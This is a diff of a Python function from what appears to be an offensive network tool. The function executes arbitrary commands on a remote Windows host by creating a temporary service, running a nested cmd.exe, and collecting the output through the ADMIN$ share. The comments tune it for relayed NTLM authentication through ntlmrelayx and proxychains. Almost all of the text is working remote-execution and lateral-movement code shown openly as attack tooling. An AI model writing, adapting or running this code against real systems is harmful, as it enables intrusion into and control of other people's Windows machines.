@@ -122,56 +122,55 @@ def _rand(n=8):
 # ── SCM exec backend ──────────────────────────────────────────────────────────
 
 def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
-    """Execute a command via a transient service over named pipes (port 445 only)."""
+    """Execute a command via a transient service, reading output over SMB.
+
+    Transport split:
+    - Scm create  → TCP/port 135 (named-pipe create has an Titanis bug; -PreferSmb
+                    fails with ERROR_INVALID_PARAMETER on CreateService RPC)
+    - Scm start   → named pipe / port 445 (-PreferSmb)
+    - Smb2Client  → named pipe / port 445
+    - Scm delete  → named pipe / port 445 (-PreferSmb)
+
+    Binary path pattern: outer cmd.exe is the service binary (Session 0, no
+    inherited console), inner cmd.exe is launched as a child process and DOES
+    get proper stdout handle inheritance for external executables (whoami,
+    ipconfig, etc.).  Without the nested cmd, external executables produce 0
+    bytes even though builtins (echo, dir, set) work fine.
+    """
     svc_name  = 'ts' + _rand(6)
     out_fname = _rand(10) + '.txt'
     out_win   = f'C:\\Windows\\Temp\\{out_fname}'
-    # Use resolved IP in UNC path — IP-based paths skip DFS referral lookups,
-    # which would otherwise try port 389 (LDAP) that ntlmrelayx can't relay.
+    # Resolved IP skips DFS referral lookups (which contact the DC on LDAP/389,
+    # a port ntlmrelayx can't relay).
     smb_host  = _resolve_ip(host)
     out_unc   = f'\\\\{smb_host}\\ADMIN$\\Temp\\{out_fname}'
 
-    # cmd.exe runs the command, redirects stdout+stderr to a temp file.
-    # Quoting: the outer quotes are for cmd /c; the inner command is raw.
-    bin_path = f'cmd.exe /c "cd /d {cwd} & ({command}) > {out_win} 2>&1"'
+    # Nested cmd: outer cmd is the SCM-launched service (no console / Session 0).
+    # Inner cmd inherits stdout properly so external executables can write output.
+    bin_path = (
+        f'C:\\Windows\\System32\\cmd.exe /c '
+        f'cmd.exe /c "cd /d {cwd} & ({command}) > {out_win} 2>&1"'
+    )
 
     if verbose:
         print(f'  [scm] svc={svc_name}  out={out_win}', file=sys.stderr)
+        print(f'  [scm] bin={bin_path}',                 file=sys.stderr)
 
-    # -PreferSmb forces named-pipe transport (port 445 only, no TCP/135).
-    # Do NOT add -UseTcp4Only here — Titanis' ResolveStaticAsync fails when
-    # forced to filter to AF_INET only; without the flag it resolves both
-    # A+AAAA and falls through to IPv4 correctly under proxychains.
-    _sf = ['-PreferSmb']
-
-    _, rc = run(SCM, 'create', auth,
-                [host, svc_name, bin_path, '-Start'] + _sf,
+    # Create via TCP (port 135) — -PreferSmb on create is a known Titanis bug.
+    _, rc = run(SCM, 'create', auth, [host, svc_name, bin_path],
                 verbose=verbose, timeout=30)
     if rc != 0:
         return f'[!] Scm create failed (rc={rc})\n', rc
 
-    # Poll until the service reaches Stopped state
-    deadline = time.time() + timeout
-    state    = 'StartPending'
-    while time.time() < deadline:
-        time.sleep(0.5)
-        out, _ = run(SCM, 'query', auth,
-                     [host, '-ConsoleOutputStyle', 'Csv'] + _sf,
-                     verbose=False, timeout=15)
-        for row in _parse_csv(out):
-            if row.get('ServiceName', '').lower() == svc_name.lower():
-                state = row.get('State', state)
-                if verbose:
-                    print(f'  [scm] state={state}', file=sys.stderr)
-                break
-        if state == 'Stopped':
-            break
-    else:
-        run(SCM, 'stop', auth, [host, svc_name] + _sf,
-            verbose=verbose, timeout=15)
+    # Start via named pipe (port 445).  cmd.exe exits without calling
+    # SetServiceStatus, so SCM raises ERROR_SERVICE_REQUEST_TIMEOUT — that is
+    # the expected "success" signal meaning the command ran.
+    _, _ = run(SCM, 'start', auth, [host, svc_name, '-PreferSmb'],
+               verbose=verbose, timeout=max(timeout, 40))
 
-    # Use resolved IP in UNC path to skip DFS referral lookups — DFS contacts
-    # the DC on LDAP/389 which ntlmrelayx can't relay ("no handler for port").
+    # Brief sleep so cmd.exe flushes the output file before we read it.
+    time.sleep(3)
+
     result    = ''
     local_tmp = tempfile.mktemp(suffix='.txt')
     out, rc = run(SMB, 'get', auth,
@@ -187,7 +186,7 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
             except OSError:
                 pass
 
-    run(SCM, 'delete', auth, [host, svc_name] + _sf,
+    run(SCM, 'delete', auth, [host, svc_name, '-PreferSmb'],
         verbose=verbose, timeout=15)
 
     return result, 0
